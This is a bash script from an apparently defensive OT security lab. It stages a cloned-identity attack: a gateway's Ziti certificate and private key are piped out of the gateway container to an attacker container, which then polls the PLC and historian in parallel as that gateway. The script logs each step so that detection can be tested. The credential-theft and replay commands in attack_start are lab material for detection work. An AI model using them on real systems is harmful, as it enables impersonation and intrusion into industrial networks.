#!/bin/bash
# Scenario 1, a gateway's identity copied and used in parallel from another
# machine.
#
# The attacker, with root on gateway-a, copies its enrolled identity (the
# .json holding certificate and private key) to a machine of their own on
# the ot network, the attacker service (Compose profile "attacker", so
# `docker compose up` leaves it out; IP ATTACKER_OT_IP). The certificate
# is valid and the posture is declared by the attacker's own tunneler, so
# no native check notices. gateway-a itself is never touched and keeps
# running as usual.
#
# The clone runs the unmodified polling loop as gateway-a: it reads the plc
# and posts to the historian through its own ziti-edge-tunnel, every
# CLONE_INTERVAL seconds. Two variants:
#   CLONE_INTERVAL=10 (default)  same rhythm as the real gateway
#   CLONE_INTERVAL=3             a different rhythm
# What should give it away: the same identity logged in from two IPs, a
# second IP reading the plc, and the identity's rhythm.
#
# The attacker container has no volume: it cannot reach any identity or
# log of the lab. It is started before the run, idle (its entrypoint is
# sleep infinity), and removed at the end of the attack, with its copy of
# the identity. The polling loop is started before the tunneler, so the
# clone's tunneler never reports the posture of a machine with no
# gateway-poller running: the process posture check belongs to the
# identity, shared with the real gateway-a. Removing the container stops
# both at once.
#
# The output of the clone's polling loop and tunneler goes to
# logs/runs/<run id>.clone-poller.log and .clone-tunnel.log: what the
# attacker did, not a source.
#
#   scenarios/cloned-identity/run.sh                    # same rhythm
#   CLONE_INTERVAL=3 scenarios/cloned-identity/run.sh   # different rhythm
source "$(dirname "$0")/../common/lib.sh"

TARGET=gateway-a
CLONE_INTERVAL="${CLONE_INTERVAL:-10}"
IDENTITY="/identities/$TARGET.json"
ATTACKER="docker compose --profile attacker"

attack_start() {
  local t
  # the theft: only gateway-a's identity file, through a pipe, no copy on
  # the host
  docker compose exec -T "$TARGET" cat "$IDENTITY" \
    | $ATTACKER exec -T attacker sh -c "mkdir -p /identities && cat > $IDENTITY"
  event action what="identity copied to the attacker" gateway="$TARGET"

  t=$(lab_now)
  $ATTACKER exec -T -e POLL_INTERVAL="$CLONE_INTERVAL" attacker gateway-poller poller.py \
    < /dev/null > "$RUNS_DIR/$RUN_ID.clone-poller.log" 2>&1 &
  POLLER_JOB=$!
  event_at "$t" action what="clone polling loop started" gateway="$TARGET" \
    interval_s="$CLONE_INTERVAL" log="$RUN_ID.clone-poller.log"

  t=$(lab_now)
  $ATTACKER exec -T attacker ziti-edge-tunnel run -i "$IDENTITY" \
    < /dev/null > "$RUNS_DIR/$RUN_ID.clone-tunnel.log" 2>&1 &
  TUNNEL_JOB=$!
  event_at "$t" action what="clone tunneler started" gateway="$TARGET" log="$RUN_ID.clone-tunnel.log"
}

# also called on Ctrl+C
attack_stop() {
  local t
  t=$(lab_now)
  $ATTACKER rm -sf attacker || true
  wait "${POLLER_JOB:-}" "${TUNNEL_JOB:-}" 2>/dev/null || true
  event_at "$t" action what="attacker removed (clone tunneler and polling loop stopped)" gateway="$TARGET"
}

# the attacker machine, idle, before the run: no tunneler, no traffic
$ATTACKER up -d --build --no-deps attacker

run_scenario cloned-identity "$TARGET" \
  "scenario 1: gateway-a's identity copied to another machine on ot and used in parallel" \
  clone_interval_s="$CLONE_INTERVAL" attacker_ip="$(grep '^ATTACKER_OT_IP=' .env | cut -d= -f2)"
